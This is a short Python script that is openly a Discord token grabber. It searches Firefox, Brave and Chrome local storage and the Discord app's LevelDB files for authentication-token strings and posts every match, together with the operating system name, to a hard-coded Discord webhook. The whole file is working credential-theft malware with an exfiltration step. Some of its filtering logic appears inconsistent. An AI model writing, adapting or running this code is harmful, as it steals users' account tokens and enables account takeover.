
import os, json, requests, sys, sqlite3
from pathlib import Path

WEBHOOK = "https://discord.com/api/webhooks/1573234778780598344/BWbg0RzJXBrC5a7VsJ77SDHeKDGY75LAqHX5Tgg3eys3zBfY7H3SL8X32IhgfQFNF1BH"

def get_tokens(path):
    tokens = []
    if not path.exists(): return tokens
    for f in path.iterdir():
        if f.is_file():
            try:
                with open(f, 'r', encoding='utf-8') as file:
                    content = file.read().replace('\\n','').replace('\\t','')
                    try:
                        data = json.loads(content)
                        if isinstance(data, dict):
                            for k,v in data.items():
                                if isinstance(v, str) and len(v)>20 and '.' in v:
                                    tokens.append(v)
                    except:
                        import re
                        tokens.extend(re.findall(r'[a-zA-Z0-9_\-]{24}\\.[a-zA-Z0-9_\-]{6}\\.[a-zA-Z0-9_\-]{20,}', content))
            except: pass
    return list(set(tokens))

tokens = []
# Chrome/Brave/Firefox LocalStorage
paths = [
    Path(os.environ.get('APPDATA',''))/ 'Mozilla/Firefox/Profiles',
    Path(os.environ.get('LOCALAPPDATA',''))/ 'BraveSoftware/Brave-Browser/User Data/Default/Local Storage',
    Path(os.environ.get('LOCALAPPDATA',''))/ 'Google/Chrome/User Data/Default/Local Storage'
]
for p in paths:
    tokens.extend(get_tokens(p))

# Discord App (LevelDB)
dp = [Path(os.environ.get('APPDATA',''))/ 'discord/Local Storage/leveldb', 
      Path.home()/ 'Library/Application Support/discord/Local Storage/leveldb']
for p in dp:
    tokens.extend(get_tokens(p))

final = [t for t in tokens if len(t)>20 and t.count('.')<2]
msg = "**PC Tokens:**\n" + "\n".join([f"`{t}`" for t in final]) or "*None found*"
requests.post(WEBHOOK, json={"embeds":[{"title":"💻 PC Token Grab","description":msg+f"\n\n**OS:** {sys.platform}"}]})
